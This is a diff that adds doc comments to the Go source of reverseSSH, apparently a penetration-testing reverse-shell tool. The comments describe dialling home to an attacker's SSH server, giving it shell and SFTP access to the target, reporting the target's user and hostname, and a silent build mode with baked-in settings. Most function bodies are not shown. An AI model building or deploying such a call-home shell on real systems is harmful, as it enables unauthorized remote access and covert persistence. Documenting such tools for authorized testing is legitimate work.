@@ -37,17 +37,34 @@ import (
 	"golang.org/x/term"
 )
 
+// params holds the runtime configuration derived from CLI flags or ldflags defaults.
 type params struct {
-	LUSER        string
-	LHOST        string
-	LPORT        uint
+	// LUSER is the username used when dialling home in the reverse scenario.
+	LUSER string
+	// LHOST is the target host to connect to in the reverse scenario.
+	// An empty value causes reverseSSH to start in listening (bind) mode.
+	LHOST string
+	// LPORT is the local port to listen on (bind mode) or the remote port to
+	// connect to (reverse mode).
+	LPORT uint
+	// homeBindPort is the port that the attacker's SSH server will bind to and
+	// expose to local connections after a successful reverse connection.
+	// A value of 0 lets the OS pick a free port.
 	homeBindPort uint
-	listen       bool
-	shell        string
-	noShell      bool
-	verbose      bool
+	// listen forces bind mode regardless of whether LHOST is set.
+	listen bool
+	// shell is the path to the shell binary spawned for interactive sessions.
+	shell string
+	// noShell denies all shell, exec, subsystem, and local port-forwarding
+	// requests; useful when only catching incoming reverse connections.
+	noShell bool
+	// verbose enables log output; when false all log output is discarded.
+	verbose bool
 }
 
+// createLocalPortForwardingCallback returns a callback that controls whether
+// local port-forwarding requests (direct-tcpip) are allowed. When forbidden is
+// true every request is denied and logged; otherwise all requests are accepted.
 func createLocalPortForwardingCallback(forbidden bool) ssh.LocalPortForwardingCallback {
 	return func(ctx ssh.Context, dhost string, dport uint32) bool {
 		if forbidden {
@@ -59,6 +76,8 @@ func createLocalPortForwardingCallback(forbidden bool) ssh.LocalPortForwardingCa
 	}
 }
 
+// createReversePortForwardingCallback returns a callback that unconditionally
+// allows reverse port-forwarding requests (tcpip-forward), logging each attempt.
 func createReversePortForwardingCallback() ssh.ReversePortForwardingCallback {
 	return func(ctx ssh.Context, host string, port uint32) bool {
 		log.Printf("Attempt to bind at %s:%d granted", host, port)
@@ -66,6 +85,9 @@ func createReversePortForwardingCallback() ssh.ReversePortForwardingCallback {
 	}
 }
 
+// createSessionRequestCallback returns a callback that controls whether
+// shell, exec, and subsystem requests are permitted. When forbidden is true
+// every such request is denied and logged; otherwise all requests are accepted.
 func createSessionRequestCallback(forbidden bool) ssh.SessionRequestCallback {
 	return func(sess ssh.Session, requestType string) bool {
 		if forbidden {
@@ -76,6 +98,9 @@ func createSessionRequestCallback(forbidden bool) ssh.SessionRequestCallback {
 	}
 }
 
+// createPasswordHandler returns a handler that authenticates incoming
+// connections by comparing the supplied password against localPassword.
+// Successful and failed attempts are both logged.
 func createPasswordHandler(localPassword string) ssh.PasswordHandler {
 	return func(ctx ssh.Context, pass string) bool {
 		passed := pass == localPassword
@@ -88,6 +113,9 @@ func createPasswordHandler(localPassword string) ssh.PasswordHandler {
 	}
 }
 
+// createPublicKeyHandler returns a handler that authenticates incoming
+// connections against the single authorizedKey. If authorizedKey is empty,
+// nil is returned which disables public-key authentication entirely.
 func createPublicKeyHandler(authorizedKey string) ssh.PublicKeyHandler {
 	if authorizedKey == "" {
 		return nil
@@ -109,6 +137,8 @@ func createPublicKeyHandler(authorizedKey string) ssh.PublicKeyHandler {
 	}
 }
 
+// createSFTPHandler returns an SSH subsystem handler that serves an SFTP
+// session using the pkg/sftp library, enabling full file-transfer support.
 func createSFTPHandler() ssh.SubsystemHandler {
 	return func(s ssh.Session) {
 		server, err := sftp.NewServer(s)
@@ -127,6 +157,14 @@ func createSFTPHandler() ssh.SubsystemHandler {
 	}
 }
 
+// dialHomeAndListen connects to the attacker's SSH server at address using
+// username and the compiled-in localPassword, then requests the server to
+// bind homeBindPort on its loopback interface. The returned net.Listener
+// accepts connections forwarded from that remote port.
+//
+// If the initial password authentication fails and askForPassword is true,
+// the user is interactively prompted for a password until authentication
+// succeeds or a non-authentication error occurs.
 func dialHomeAndListen(username string, address string, homeBindPort uint, askForPassword bool) (net.Listener, error) {
 	var (
 		err    error
@@ -174,12 +212,24 @@ func dialHomeAndListen(username string, address string, homeBindPort uint, askFo
 	return ln, nil
 }
 
+// ExtraInfo carries metadata about the reverseSSH instance that dialled home.
+// It is transmitted over the custom "rs-info" SSH channel immediately after a
+// successful reverse connection so the attacker can identify the target.
 type ExtraInfo struct {
-	CurrentUser      string
-	Hostname         string
+	// CurrentUser is the OS username under which reverseSSH is running on the target.
+	CurrentUser string
+	// Hostname is the system hostname of the target machine.
+	Hostname string
+	// ListeningAddress is the address (host:port) that the attacker's SSH server
+	// bound for this reverse connection, e.g. "127.0.0.1:8888".
 	ListeningAddress string
 }
 
+// sendExtraInfo opens the custom "rs-info" SSH channel and transmits an
+// ExtraInfo payload containing the current OS user, hostname, and the address
+// the attacker's server is listening on for this connection. The remote end is
+// expected to reject the channel (with the reason "th4nkz"), which is treated
+// as a success indicator.
 func sendExtraInfo(client *gossh.Client, listeningAddress string) {
 
 	extraInfo := ExtraInfo{ListeningAddress: listeningAddress}
@@ -207,6 +257,10 @@ func sendExtraInfo(client *gossh.Client, listeningAddress string) {
 	}
 }
 
+// createExtraInfoHandler returns a channel handler for the custom "rs-info"
+// SSH channel. It deserialises the ExtraInfo payload sent by a connecting
+// reverseSSH instance and logs the target's username, hostname, and the
+// loopback address at which the reverse connection can be reached.
 func createExtraInfoHandler() ssh.ChannelHandler {
 	return func(srv *ssh.Server, conn *gossh.ServerConn, newChan gossh.NewChannel, ctx ssh.Context) {
 		var extraInfo ExtraInfo
@@ -226,6 +280,10 @@ func createExtraInfoHandler() ssh.ChannelHandler {
 	}
 }
 
+// setupParameters parses command-line flags and the optional positional
+// [<user>@]<target> argument to build a params value. When noCLI is non-empty
+// (set via ldflags at build time) the CLI is bypassed and
+// setupParametersWithoutCLI is called instead.
 func setupParameters(noCLI string) *params {
 	if noCLI != "" {
 		return setupParametersWithoutCLI()
@@ -319,6 +377,9 @@ Credentials:
 	return &p
 }
 
+// setupParametersWithoutCLI builds a params value entirely from the ldflags
+// variables, ignoring any command-line arguments. Log output is silenced.
+// This is used when the binary is compiled with NOCLI set.
 func setupParametersWithoutCLI() *params {
 	lport, err := strconv.ParseUint(LPORT, 10, 32)
 	if err != nil {
@@ -343,6 +404,10 @@ func setupParametersWithoutCLI() *params {
 	}
 }
 
+// run starts the SSH server described by server and begins accepting
+// connections. In bind mode (p.listen == true or p.LHOST == "") the server
+// listens on :<p.LPORT>. In reverse mode it dials home via
+// dialHomeAndListen and serves on the resulting remote-forwarded listener.
 func run(p *params, server ssh.Server) {
 	var (
 		ln  net.Listener
